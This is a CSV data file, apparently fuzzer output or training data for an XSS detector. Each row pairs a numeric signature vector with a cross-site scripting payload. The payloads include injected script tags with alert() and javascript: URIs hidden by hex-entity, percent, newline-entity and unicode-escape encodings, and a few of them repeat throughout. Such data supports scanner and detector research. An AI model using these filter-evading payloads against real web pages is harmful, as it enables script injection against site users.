eval_place,sig_vector,sig_string
0,1,2
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[186, 232, 54, 231, 94]","""java&NewLine;script:alert(1)""<script>onload=alert();</script>$on."
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[186, 232, 54, 231, 94]","""java&NewLine;script:alert(1)""<script>onload=alert();</script>$on."
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[53, 232, 54, 231, 131]",javascript:al\u0065rt();<script>onload=alert();</script></button>
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[186, 232, 54, 231, 94]","""java&NewLine;script:alert(1)""<script>onload=alert();</script>$on."
body_tag,"[4, 232, 54, 231, 108]",<script <script>onload=alert();</script>a='constructor';
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[186, 232, 54, 231, 94]","""java&NewLine;script:alert(1)""<script>onload=alert();</script>$on."
body_tag,"[186, 232, 54, 231, 94]","""java&NewLine;script:alert(1)""<script>onload=alert();</script>$on."
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[186, 232, 54, 231, 94]","""java&NewLine;script:alert(1)""<script>onload=alert();</script>$on."
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[186, 232, 54, 231, 94]","""java&NewLine;script:alert(1)""<script>onload=alert();</script>$on."
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[4, 232, 54, 231, 138]",<script <script>onload=alert();</script>call.
body_tag,"[193, 232, 54, 231, 131]","""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""<script>onload=alert();</script></button>"
